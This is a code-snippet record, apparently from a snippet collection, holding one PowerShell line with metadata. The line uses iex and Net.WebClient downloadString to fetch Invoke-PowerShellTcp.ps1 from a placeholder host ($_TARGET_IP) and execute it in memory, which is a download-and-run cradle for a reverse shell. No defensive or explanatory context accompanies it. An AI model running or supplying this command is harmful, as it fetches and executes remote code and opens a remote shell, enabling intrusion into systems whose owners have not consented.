---
id: baae4382-712b-455b-9cf0-9db07d1b54e0
type: code
language: Powershell
verified: false
created_at: '2020-03-16T19:30:06.345207+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet baae4382

**Language**: Powershell

```powershell
iex (New-Object Net.WebClient).downloadString('http://$_TARGET_IP/Invoke-PowerShellTcp.ps1')
```
